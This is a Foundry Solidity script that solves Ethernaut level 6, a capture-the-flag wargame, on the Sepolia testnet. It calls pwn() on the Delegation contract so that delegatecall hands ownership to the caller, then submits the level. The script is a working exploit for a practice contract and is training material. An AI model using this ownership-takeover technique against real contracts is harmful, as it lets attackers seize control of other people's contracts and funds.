// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console2} from "forge-std/Script.sol";
import {IEthernaut} from "../interfaces/IEthernaut.sol";
import {Delegate, Delegation} from "../src/Level06.sol";

contract Level06 is Script {
    IEthernaut ethernaut = IEthernaut(vm.envAddress("ETHERNAUT_ADDR"));
    address caller = vm.addr(vm.envUint("PRIVATE_KEY"));

    function run() public {
        Delegation instance = Delegation(vm.envAddress("LVL06_ADDR"));
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console2.log("owner: ", instance.owner());

        (bool success, ) = address(instance).call(
            abi.encodeWithSignature("pwn()")
        );

        address owner = instance.owner();
        console2.log("owner: ", owner);

        if (!success || owner != caller) {
            console2.log("call failed");
        } else ethernaut.submitLevelInstance(address(instance));

        vm.stopBroadcast();
    }
}

// forge script script/Level06.s.sol --broadcast --rpc-url sepolia
